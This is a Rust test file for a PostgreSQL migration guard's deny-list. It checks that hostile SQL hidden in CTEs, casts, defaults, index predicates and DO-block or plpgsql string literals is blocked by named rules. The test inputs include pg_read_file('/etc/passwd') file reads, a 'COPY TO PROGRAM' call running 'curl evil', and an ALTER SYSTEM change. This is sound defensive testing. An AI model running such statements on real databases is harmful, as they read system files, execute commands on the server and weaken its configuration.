//! The deny-list must catch a hostile construct wherever it is HIDDEN, not only
//! at the top level of a statement.
//!
//! `guard_smoke.rs` proves the rules fire on direct statements. A parse-time
//! deny-list has a characteristic failure mode that direct cases cannot expose:
//! matching the statement's outermost shape and missing the same verb nested one
//! level down. That is how deny-lists rot - a rule keeps passing its original
//! test while an attacker moves the payload into a CTE.
//!
//! Every case below was measured against the CONFINED profile and denied, each by
//! a NAMED rule. The names matter: they are what tells an operator which policy
//! stopped them, and what makes the list auditable rather than a black box.
//!
//! TWO DEPTHS ARE COVERED, and they are different mechanisms:
//!
//!   - SYNTACTIC nesting - CTE, subquery, cast, CASE, column DEFAULT, index
//!     predicate. Caught by the analyser's tree walk.
//!   - STRING-LITERAL payloads - a denied verb inside a `DO` block or a
//!     `plpgsql` `EXECUTE`. The statement itself is innocuous; the danger is in a
//!     literal, and the guard reads those too.
//!
//! A guard that denied everything would produce an identical-looking result, so
//! the benign CTE control is what makes the rest meaningful.
//!
//! WHY THESE ASSERT THE RULE NAME AND NOT MERELY "denied". Disabling the guard
//! string-literal scan, as a sensitivity check, did NOT let the `DO` block
//! through - a coarser rule, `dangerous_construct_in_body`, still caught it.
//! There is defence in depth here, which is good, and it means a bare
//! `is_err()` assertion would have stayed green while the precise rule stopped
//! firing and the operator started getting a vaguer message. Pinning the rule
//! name is what makes that degradation visible.

mod support;

use zero_migrate_guard::guard::{GuardConfig, SqlGuard};
use zero_migrate_ir::dialect::SqlDialect;

fn confined() -> SqlGuard {
    SqlGuard::new(GuardConfig::from_policy(
        support::no_inject("app1"),
        SqlDialect::Postgres,
    ))
}

#[track_caller]
fn denied_by(sql: &str, expected_rule: &str) {
    let error = confined()
        .check(sql)
        .err()
        .unwrap_or_else(|| panic!("must be denied, was allowed: {sql}"));
    let rendered = format!("{error}");
    assert!(
        rendered.contains(expected_rule),
        "must be denied by rule {expected_rule:?}, got: {rendered}"
    );
}

#[test]
fn a_file_read_hidden_by_syntax_is_still_denied() {
    for sql in [
        "WITH x AS (SELECT pg_read_file('/etc/passwd') AS c) SELECT c FROM x",
        "CREATE VIEW v AS SELECT (SELECT pg_read_file('/etc/passwd'))",
        "SELECT (pg_read_file('/etc/passwd'))::text",
        "SELECT CASE WHEN true THEN pg_read_file('/etc/passwd') ELSE '' END",
        "CREATE TABLE app1.t (id int, c text DEFAULT pg_read_file('/etc/passwd'))",
        "CREATE INDEX ix ON app1.t (id) WHERE pg_read_file('/etc/passwd') IS NOT NULL",
    ] {
        denied_by(sql, "file_access_function");
    }
}

#[test]
fn qualification_and_casing_do_not_evade_the_rule() {
    denied_by(
        "SELECT pg_catalog.pg_read_file('/etc/passwd')",
        "file_access_function",
    );
    denied_by("SELECT PG_READ_FILE('/etc/passwd')", "file_access_function");
}

#[test]
fn a_denied_verb_carried_in_a_string_literal_is_still_denied() {
    // The statement is innocuous; the payload is in a literal. A tree walk alone
    // would clear both of these.
    denied_by(
        "DO $$ BEGIN EXECUTE 'ALTER SYSTEM SET wal_level = minimal'; END $$",
        "alter_system",
    );
    denied_by(
        "CREATE FUNCTION f() RETURNS void AS $$ BEGIN EXECUTE 'COPY t TO PROGRAM ''curl evil''' ; END $$ LANGUAGE plpgsql",
        "copy_program_rce",
    );
}

#[test]
fn a_benign_nested_statement_is_still_allowed() {
    // THE CONTROL. Without it, a guard that denied every nested construct would
    // satisfy every assertion above.
    confined()
        .check("WITH x AS (SELECT 1 AS c) SELECT c FROM x")
        .expect("an ordinary CTE must pass");
}
